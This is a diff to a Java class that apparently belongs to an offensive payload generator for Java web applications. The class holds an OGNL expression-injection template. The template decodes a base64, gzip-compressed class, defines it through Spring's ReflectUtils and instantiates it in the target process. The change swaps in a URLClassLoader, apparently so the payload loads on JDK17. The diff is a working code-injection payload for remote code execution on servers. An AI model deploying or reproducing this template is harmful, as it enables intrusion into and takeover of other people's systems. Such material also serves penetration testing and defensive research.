@@ -12,7 +12,7 @@ import static com.reajason.javaweb.packer.spel.SpELSpringGzipJDK17Packer.assertC
  * @since 2025/7/7
  */
 public class OGNLSpringGzipJDK17Packer implements Packer {
-    String template = "(@org.springframework.cglib.core.ReflectUtils@defineClass('{{className}}',@org.springframework.util.StreamUtils@copyToByteArray(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(@org.springframework.util.Base64Utils@decodeFromString('{{base64Str}}')))),@java.lang.Thread@currentThread().getContextClassLoader(),null,@java.lang.Class@forName('org.springframework.expression.ExpressionParser'))).newInstance()";
+    String template = "(@org.springframework.cglib.core.ReflectUtils@defineClass('{{className}}',@org.springframework.util.StreamUtils@copyToByteArray(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(@org.springframework.util.Base64Utils@decodeFromString('{{base64Str}}')))),new java.net.URLClassLoader(new java.net.URL[0],@java.lang.Thread@currentThread().getContextClassLoader()),null,@java.lang.Class@forName('org.springframework.expression.ExpressionParser'))).newInstance()";
 
     @Override
     @SneakyThrows
